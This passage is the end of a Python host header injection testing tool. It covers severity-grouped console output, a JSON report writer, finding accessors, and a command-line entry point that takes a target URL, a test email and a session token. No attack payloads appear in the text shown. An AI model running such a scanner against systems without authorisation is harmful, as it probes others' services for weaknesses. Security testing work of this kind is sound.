        print(f"\n{Fore.RED}[!] HOST HEADER INJECTION VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            severity = finding.severity.value.upper()
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)

        # Print by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                findings = by_severity[severity]
                print(f"\n{severity}: {len(findings)}")
                for f in findings[:3]:  # Show first 3
                    print(f"  - {f.title}")
                    print(f"    Endpoint: {f.endpoint}")
                    print(f"    Injected Host: {f.injected_host}")

    def generate_report(self, output_file: str):
        """Generate detailed vulnerability report"""

        report = {
            "scan_info": {
                "target": self.target_url,
                "target_domain": self.target_domain,
                "total_findings": len(self.findings),
                "tests_run": self.tests_run,
                "timestamp": datetime.now().isoformat()
            },
            "summary": {
                "critical": sum(1 for f in self.findings if f.severity == Severity.CRITICAL),
                "high": sum(1 for f in self.findings if f.severity == Severity.HIGH),
                "medium": sum(1 for f in self.findings if f.severity == Severity.MEDIUM),
                "low": sum(1 for f in self.findings if f.severity == Severity.LOW),
                "info": sum(1 for f in self.findings if f.severity == Severity.INFO)
            },
            "findings": [f.to_dict() for f in self.findings]
        }

        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n{Fore.GREEN}[*] Report saved to: {output_file}{Style.RESET_ALL}")
        print(f"[*] Total findings: {len(self.findings)}")
        print(f"[*] Severity breakdown: {report['summary']}")

    def get_findings(self) -> List[HostInjectionFinding]:
        """Get all findings"""
        return self.findings

    def get_findings_by_severity(self, severity: Severity) -> List[HostInjectionFinding]:
        """Get findings by severity level"""
        return [f for f in self.findings if f.severity == severity]


async def main():
    """Main execution function"""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python host_header_injection_tester.py <target_url> [test_email] [session_token]")
        print("Example: python host_header_injection_tester.py https://example.com test@example.com")
        sys.exit(1)

    target = sys.argv[1]
    test_email = sys.argv[2] if len(sys.argv) > 2 else "security@example.com"
    session_token = sys.argv[3] if len(sys.argv) > 3 else None

    tester = HostHeaderInjectionTester(target, test_email=test_email, session_token=session_token)
    findings = await tester.run_full_scan()

    # Generate report
    output_file = f"host-header-injection-{tester.target_domain.replace('.', '-')}.json"
    tester.generate_report(output_file)


if __name__ == "__main__":
    asyncio.run(main())
